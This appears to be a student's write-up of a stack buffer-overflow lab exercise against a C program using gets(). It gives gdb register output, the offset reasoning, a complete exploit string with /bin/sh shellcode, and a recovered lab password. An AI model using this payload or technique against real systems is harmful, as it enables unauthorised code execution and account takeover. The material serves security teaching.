@@ -1,0 +1,59 @@
+Question 1
+
+The vulnerability came from the use of "gets(door);" on line 7 of "dejavu.c" because it will not stop a buffer overflow. Basically, if a user inputs more data that can fit in the buffer, then there will be an overflow that will write over the old data with the user's input that is spilled over.
+
+What I did:
+
+invoke -d dejavu
+b 8 (setting a breakpoint so code does not complete)
+run
+info registers (checking for the ebp, which is the sfp...)
+
+(gdb) info registers
+eax            0xbffff7b8       -1073743944
+ecx            0xb7fd38c4       -1208141628
+edx            0xbffff7b8       -1073743944
+ebx            0xb7fd2000       -1208147968
+esp            0xbffff7a0       0xbffff7a0
+ebp            0xbffff7c8       0xbffff7c8
+esi            0x0      0
+edi            0x0      0
+eip            0x804841d        0x804841d <deja_vu+17>
+eflags         0x286    [ PF SF IF ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+
+
+By running "info registers" I identify that the ebp is 0xbffff7c8.
+
+Because the shellcode cannot fit in door[8], I will need to put the shellcode somewhere.
+I end up putting the shellcode above the rip because I can write over the old data above it.
+To find where to start writing the shellcode, I do ebp + 8 to get the address (0xbffff7d0).
+The reason why it is "+8" is because 4 bytes above the ebp is the rip, which is where I will need to store the return address.
+Therefore, "+8" means that it is on top of the rip.
+On top of the rip is where I will put the shellcode.
+For the rip, I need to write where the shellcode starts, which is at 0xbffff7d0.
+Now I have the return address and shellcode down.
+The last thing I need to do is to put in values for what is supposed to be passed into the program.
+For this, I just write 16 "A's" as garbage values just to fill up door[8].
+To fill in the ebp, which is between the allocated space for the character array and the rip, I fill in an additional 4 garbage values to take up space.
+To keep it consistent, I also use "A's" for those 4 values.
+
+Now, I have all the things I need to inject into the code.
+First, I have the 20 garbage values.
+Next, I have the address of where the shellcode starts so the program will go to there.
+Last, I have the shellcode.
+
+To pass it in, I pass in 20 "A's", the address in little endian format (\xd0\xf7\xff\xbf), and the shellcode.
+
+Therefore, I pass in b"AAAAAAAAAAAAAAAAAAAA\xd0\xf7\xff\xbf" + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
+
+To end it, I add a new line to the end.
+
+After exploiting the code, I was able to login as "smith".
+His message in README is "Welcome to the real world."
+His username is "smith" and his password is "f6g(Bz{w".
